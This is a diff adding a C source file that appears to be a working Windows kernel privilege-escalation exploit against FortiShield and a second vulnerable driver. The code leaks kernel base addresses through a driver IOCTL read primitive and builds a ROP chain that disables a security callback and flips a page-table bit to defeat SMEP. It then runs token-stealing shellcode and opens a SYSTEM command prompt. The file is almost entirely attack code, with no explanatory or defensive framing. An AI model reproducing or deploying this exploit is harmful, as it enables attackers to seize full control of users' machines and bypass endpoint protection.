@@ -1,0 +1,225 @@
+#include "stdafx.h"
+#include <stdio.h>
+#include <Windows.h>
+#include <Psapi.h>
+#include <Shlobj.h>
+
+#pragma comment (lib,"psapi")
+
+PULONGLONG leak_buffer = (PULONGLONG)VirtualAlloc((LPVOID)0x000000001a000000, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+ULONGLONG leakQWORD(ULONGLONG addr, HANDLE driver)
+{
+	memset((LPVOID)0x000000001a000000, 0x11, 0x1000);
+	memset((LPVOID)0x000000001a001000, 0x22, 0x1000);
+	leak_buffer[0] = 0x000000001a000008;
+	leak_buffer[1] = 0x0000000000000003;
+	leak_buffer[4] = 0x000000001a000028;
+	leak_buffer[6] = addr - 0x70;
+
+	DWORD IoControlCode = 0x22608C;
+	LPVOID InputBuffer = (LPVOID)0x000000001a000000;
+	DWORD InputBufferLength = 0x20;
+	LPVOID OutputBuffer = (LPVOID)0x000000001a001000;
+	DWORD OutputBufferLength = 0x110;
+	DWORD lpBytesReturned;
+
+	BOOL triggerIOCTL;
+	triggerIOCTL = DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
+	if (!triggerIOCTL)
+	{
+		printf("[!] Error in the SYSCALL: %d\n", GetLastError());
+	}
+
+	ULONGLONG result = leak_buffer[0x202];
+	return result;
+}
+
+ULONGLONG leakNtBase(HANDLE driver)
+{
+	ULONGLONG teb = (ULONGLONG)NtCurrentTeb();
+	ULONGLONG thread = *(PULONGLONG)(teb + 0x78);
+	ULONGLONG threadInfo = leakQWORD(thread, driver);
+	ULONGLONG ntAddr = leakQWORD(threadInfo + 0x2a8, driver);
+	ULONGLONG baseAddr = 0;
+	ULONGLONG signature = 0x00905a4d;
+	ULONGLONG searchAddr = ntAddr & 0xFFFFFFFFFFFFF000;
+
+	while (TRUE)
+	{
+		ULONGLONG readData = leakQWORD(searchAddr, driver);
+		ULONGLONG tmp = readData & 0xFFFFFFFF;
+		/*
+		printf("%llx\n", readData);
+		printf("%llx\n", tmp);
+		*/
+
+		if (tmp == signature)
+		{
+			baseAddr = searchAddr;
+			break;
+		}
+		searchAddr = searchAddr - 0x1000;
+	}
+	return baseAddr;
+}
+
+ULONGLONG leakFortiBase(HANDLE driver, ULONGLONG ntBase)
+{
+	ULONGLONG PsLoadModuleListAddr = ntBase + 0x34c5a0;
+	ULONGLONG searchAddr = leakQWORD(PsLoadModuleListAddr, driver);
+	ULONGLONG addr = 0;
+	while (1)
+	{
+		ULONGLONG namePointer = leakQWORD(searchAddr + 0x60, driver);
+		ULONGLONG name = leakQWORD(namePointer, driver);
+		if (name == 0x00740072006f0046)
+		{
+			name = leakQWORD(namePointer + 8, driver);
+			if (name == 0x0069006800530069)
+			{
+				addr = leakQWORD(searchAddr + 0x30, driver);
+				break;
+			}
+		}
+		searchAddr = leakQWORD(searchAddr, driver);
+	}
+	return addr;
+}
+
+ULONGLONG allocate_fake_stack(ULONGLONG ntBase, ULONGLONG fortishield_callback, ULONGLONG fortishield_restore, ULONGLONG pte_result)
+{
+	PULONGLONG fake_stack = (PULONGLONG)VirtualAlloc((LPVOID)0x00000000f5ffe000, 0x12000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (fake_stack == NULL)
+	{
+		printf("[!] Error while allocating the fake stack: %d\n", GetLastError());
+		return 1;
+	}
+
+	memset(fake_stack, 0x41, 0x12000);
+	PULONGLONG ropStack = (PULONGLONG)fake_stack + 0x2000;
+	DWORD index = 0;
+
+	// <NULL Callback>
+	ropStack[index] = ntBase + 0x1684ef; index++;       // pop rax ; pop rcx ; ret
+	ropStack[index] = fortishield_callback; index++;    // FortiShield Callback
+	ropStack[index] = 0x0000000000000000; index++;      // NULL
+	ropStack[index] = ntBase + 0x937eb; index++;        // mov qword [rax], rcx ; ret
+	// </NULL Callback>
+
+	// <Flip U=S bit>
+	ropStack[index] = ntBase + 0x88614; index++;        // pop rax ; ret
+	ropStack[index] = pte_result; index++;              // PTE VA
+	ropStack[index] = ntBase + 0x1a3cb2; index++;       // pop rdx ; ret
+	ropStack[index] = 0x0000000000000063; index++;      // DIRTY + ACCESSED + R/W + PRESENT
+	ropStack[index] = ntBase + 0xe8a8b; index++;        // mov byte [rax], dl ; add eax, 0x01740000 ; ret
+	ropStack[index] = ntBase + 0x11e000; index++;       // wbinvd  ; ret
+	// </Flip U=S bit>
+
+	// <Restore variables & shellcode>
+	ropStack[index] = 0x00000000f6000100; index++;      // Shellcode address
+	ropStack[index] = fortishield_restore; index++;     // FortiShield return location
+	// </Restore variables & shellcode>
+
+	char token_steal[] = 
+		"\x48\x31\xc0\x65\x48\x8b\x80"
+		"\x88\x01\x00\x00\x48\x8b\x80"
+		"\xb8\x00\x00\x00\x49\x89\xc0"
+		"\x48\x8b\x80\xe8\x02\x00\x00"
+		"\x48\x2d\xe8\x02\x00\x00\x48"
+		"\x8b\x88\xe0\x02\x00\x00\x48"
+		"\x83\xf9\x04\x75\xe6\x4c\x8b"
+		"\x88\x58\x03\x00\x00\x4d\x89"
+		"\x88\x58\x03\x00\x00\x3E\x48"
+		"\x8B\x04\x24\x48\x89\xF4\x48"
+		"\x83\xEC\x20\xFF\xE0";
+
+	memcpy((fake_stack + 0x2020), token_steal, sizeof(token_steal));
+	return 0;
+}
+
+ULONGLONG get_pxe_address_64(ULONGLONG address, ULONGLONG pte_start) 
+{
+	ULONGLONG result = address >> 9;
+	result = result | pte_start;
+	result = result & (pte_start + 0x0000007ffffffff8);
+	return result;
+}
+
+int trigger_callback()
+{
+	printf("[+] Creating dummy file\n");
+	system("echo test > C:\\Users\\n00b\\AppData\\LocalLow\\test.txt");
+	printf("[+] Calling MoveFileEx()\n");
+
+	BOOL MFEresult = MoveFileEx(L"C:\\Users\\n00b\\AppData\\LocalLow\\test.txt", L"C:\\Users\\n00b\\AppData\\LocalLow\\test2.txt", MOVEFILE_REPLACE_EXISTING);
+	if (MFEresult == 0)
+	{
+		printf("[!] Error while calling MoveFileEx(): %d\n", GetLastError());
+		return 1;
+	}
+	return 0;
+}
+
+int main()
+{
+	LoadLibraryA("user32.dll"); // Populate Win32ThreadInfo
+
+	HANDLE mdare = CreateFile(L"\\\\.\\mdareDriver_48", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	if (mdare == INVALID_HANDLE_VALUE)
+	{
+		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
+		return 1;
+	}
+
+	HANDLE forti = CreateFile(L"\\\\.\\FortiShield", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	if (forti == INVALID_HANDLE_VALUE)
+	{
+		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
+		return 1;
+	}
+
+	LPDWORD hThread_id = 0;
+	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&trigger_callback, NULL, CREATE_SUSPENDED, hThread_id);
+	if (hThread == NULL)
+	{
+		printf("[!] Error while calling CreateThread: %d\n", GetLastError());
+		return 1;
+	}
+
+	BOOL hThread_priority = SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);
+	if (hThread_priority == 0)
+	{
+		printf("[!] Error while calling SetThreadPriority: %d\n", GetLastError());
+		return 1;
+	}
+
+	ULONGLONG ntBase = leakNtBase(mdare);
+	ULONGLONG ntPivot = ntBase + 0x1ab3ec; // mov esp, 0xf6000000; retn;
+	ULONGLONG ntMiGetPteAddressOffset = leakQWORD(ntBase + 0x62aeb, mdare);
+	ULONGLONG fortishieldBase = leakFortiBase(mdare, ntBase);
+	ULONGLONG fortishield_callback = fortishieldBase + 0xd150;
+	ULONGLONG fortishield_restore = fortishieldBase + 0x2f73;
+	printf("[+] ntoskrnl.exe base address is: 0x%llx\n", ntBase);
+	printf("[+] PTE VA start address is: 0x%llx\n", ntMiGetPteAddressOffset);
+	printf("[+] FortiShield.sys base address is: 0x%llx\n", fortishieldBase);
+
+	ULONGLONG pte_result = get_pxe_address_64(0xf6000000, ntMiGetPteAddressOffset);
+	printf("[+] PTE virtual address for 0xf6000000: %I64x\n", pte_result);
+	allocate_fake_stack(ntBase, fortishield_callback, fortishield_restore, pte_result);
+
+	DWORD IoControlCode = 0x220028;
+	ULONGLONG InputBuffer = ntPivot;
+	DWORD InputBufferLength = 0x8;
+	ULONGLONG OutputBuffer = 0x0;
+	DWORD OutputBufferLength = 0x0;
+	DWORD lpBytesReturned;
+
+	//DebugBreak();
+
+	BOOL triggerIOCTL = DeviceIoControl(forti, IoControlCode, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
+	ResumeThread(hThread);
+	WaitForSingleObject(hThread, INFINITE);
+	system("start cmd.exe");
+
+	return 0;
+}
